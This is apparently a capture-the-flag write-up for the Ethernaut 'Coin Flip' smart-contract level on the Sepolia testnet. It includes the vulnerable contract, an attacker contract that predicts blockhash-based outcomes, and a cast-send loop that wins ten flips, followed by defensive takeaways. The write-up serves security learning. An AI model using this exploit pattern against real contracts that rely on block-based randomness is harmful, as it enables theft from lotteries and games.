# 03 - Coin Flip

## Overview

- **Difficulty:** 4/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0xDDd84EA1C0e72dca7Bc6146FE2e33fA62dC7bd8A`](https://sepolia.etherscan.io/address/0xDDd84EA1C0e72dca7Bc6146FE2e33fA62dC7bd8A)
- **Attack Contract (`FlipCaller`):** [`0xaAfC88B9D1DE4EdDa5F026B077A592b322775e80`](https://sepolia.etherscan.io/address/0xaAfC88B9D1DE4EdDa5F026B077A592b322775e80)
- **Level Submission Tx:** [`0x42a159f442411137da8d2d6105726e7b438447f2fe0d2d8fd385c0af41d062da`](https://sepolia.etherscan.io/tx/0x42a159f442411137da8d2d6105726e7b438447f2fe0d2d8fd385c0af41d062da)

<details>
<summary>📜 <b>View All 10 Winning Flip Transactions (Sepolia Etherscan)</b></summary>

| Flip # | Transaction Hash                                                                                                                                                           |
| :----: | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|   1    | [`0x2211f6e4aa7905e517e383e9985bc9bcad182d1d5dc3ff9752e62675cbf5afea`](https://sepolia.etherscan.io/tx/0x2211f6e4aa7905e517e383e9985bc9bcad182d1d5dc3ff9752e62675cbf5afea) |
|   2    | [`0x96b5eee592e9a3333c028e5a6340413edcb1b2763d6a44a341bfa82d46aaff7f`](https://sepolia.etherscan.io/tx/0x96b5eee592e9a3333c028e5a6340413edcb1b2763d6a44a341bfa82d46aaff7f) |
|   3    | [`0xf300c7432484e4d2678deb22ea2b2b70a682e304c35635c64b8a074da0e6280a`](https://sepolia.etherscan.io/tx/0xf300c7432484e4d2678deb22ea2b2b70a682e304c35635c64b8a074da0e6280a) |
|   4    | [`0x9ec5b14b7ab977be5a9b0253aa172ac93a12da21e5bd68556092030b962fc745`](https://sepolia.etherscan.io/tx/0x9ec5b14b7ab977be5a9b0253aa172ac93a12da21e5bd68556092030b962fc745) |
|   5    | [`0x057c0442e74b1d1846a7d360e6a846fe4df2cc2d7e29abc5dccce91e638360f3`](https://sepolia.etherscan.io/tx/0x057c0442e74b1d1846a7d360e6a846fe4df2cc2d7e29abc5dccce91e638360f3) |
|   6    | [`0x6d4dbe0b9842f1132744f126e8edb2be35c8ce709ad8b95bce10388f3ba44302`](https://sepolia.etherscan.io/tx/0x6d4dbe0b9842f1132744f126e8edb2be35c8ce709ad8b95bce10388f3ba44302) |
|   7    | [`0xb295fe6ccf6ed0865973e04e8d2e015f44a3a566250c4c0511ba3bedcc778293`](https://sepolia.etherscan.io/tx/0xb295fe6ccf6ed0865973e04e8d2e015f44a3a566250c4c0511ba3bedcc778293) |
|   8    | [`0x5aa9993e43312a16ca11af96c37356b0499e59b3743f735060300e26dc4d24c8`](https://sepolia.etherscan.io/tx/0x5aa9993e43312a16ca11af96c37356b0499e59b3743f735060300e26dc4d24c8) |
|   9    | [`0x423fc61c8bf57c6c1d8a3f385aa74544aae744114620478db0f7b9e2dea42fe7`](https://sepolia.etherscan.io/tx/0x423fc61c8bf57c6c1d8a3f385aa74544aae744114620478db0f7b9e2dea42fe7) |
|   10   | [`0x449bc013db817f1c7438bca484a994ac2813607e44fc5ec4fc0f3bbe301b2015`](https://sepolia.etherscan.io/tx/0x449bc013db817f1c7438bca484a994ac2813607e44fc5ec4fc0f3bbe301b2015) |

</details>

---

## Objective

Guess the correct outcome of the coin flip 10 consecutive times in a row (`consecutiveWins == 10`).

---

## Contract Analysis

The target contract is [`src/03-coin-flip/Coinflip.sol`](./Coinflip.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

### Vulnerability Breakdown

1. **Insecure On-Chain Randomness:**
   The contract attempts to generate randomness using:

   ```solidity
   uint256 blockValue = uint256(blockhash(block.number - 1));
   uint256 coinFlip = blockValue / FACTOR;
   bool side = coinFlip == 1 ? true : false;
   ```

   The Ethereum Virtual Machine (EVM) is completely deterministic. All data, including previous block hashes (`blockhash(block.number - 1)`), is public and readable by any smart contract during execution.

2. **Exploiting via Intermediary Contract:**
   Because an attacking contract executes in the **exact same transaction and block** as the target contract, it can pre-calculate the outcome using the identical formula and pass the winning answer directly to `coinFlip.flip(side)`.

3. **The 1-Flip-Per-Block Guard:**
   ```solidity
   if (lastHash == blockValue) {
       revert();
   }
   ```
   The contract prevents multiple flips in the same block by checking if `lastHash == blockValue`. Therefore, the exploit cannot be called in a loop within a single transaction; it must be executed **10 separate times across 10 distinct blocks**.

---

## Attack Contract

The exploit contract is [`src/03-coin-flip/FlipCaller.sol`](./FlipCaller.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "./Coinflip.sol";

contract FlipCaller {
    CoinFlip public coinFlip;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFLip) {
        coinFlip = CoinFlip(_coinFLip);
    }

    function callFlip() public {
        bool side = _guessSide();
        coinFlip.flip(side);
    }

    function _guessSide() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 _coinFlip = blockValue / FACTOR;
        bool side = _coinFlip == 1 ? true : false;
        return side;
    }
}
```

---

## Step-by-Step Exploit Walkthrough

1. **Deploy `FlipCaller`:**
   Deploy `FlipCaller.sol`, passing the `CoinFlip` instance address into the constructor.
   - Deployed at: [`0xaAfC88B9D1DE4EdDa5F026B077A592b322775e80`](https://sepolia.etherscan.io/address/0xaAfC88B9D1DE4EdDa5F026B077A592b322775e80)

2. **Execute 10 Flips Across 10 Blocks:**
   Using a script loop, call `callFlip()` on `FlipCaller` once per block (waiting ~14s between transactions):

   ```bash
   for i in {1..10}; do
     cast send 0xaAfC88B9D1DE4EdDa5F026B077A592b322775e80 "callFlip()" --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY
     sleep 14
   done
   ```

3. **Verify Consecutive Wins:**

   ```bash
   cast call 0xDDd84EA1C0e72dca7Bc6146FE2e33fA62dC7bd8A "consecutiveWins()(uint256)" --rpc-url $SEPOLIA_RPC_URL
   # Output: 10
   ```

4. **Submit Instance:**
   Submit the challenge to claim completion!
   - Submission Tx: [`0x42a159f442411137da8d2d6105726e7b438447f2fe0d2d8fd385c0af41d062da`](https://sepolia.etherscan.io/tx/0x42a159f442411137da8d2d6105726e7b438447f2fe0d2d8fd385c0af41d062da)

---

## Key Security Takeaways

1. **Deterministic Execution:**
   - There is no native randomness on the blockchain. Any value computed on-chain (including `blockhash`, `block.timestamp`, and `block.prevrandao`) is deterministic and predictable.
2. **Attacker Contracts Share Block Context:**
   - Because smart contracts execute atomically within the same block and state context, an attacking contract can simulate or calculate the exact outcome before calling the victim contract.
3. **Secure Randomness in Production:**
   - Never rely on block attributes for random number generation in lotteries, gaming, or financial protocols.
   - Use proven cryptographic solutions such as **Chainlink VRF (Verifiable Random Function)** or **commit-reveal** schemes to ensure tamper-proof, unpredictable outcomes.
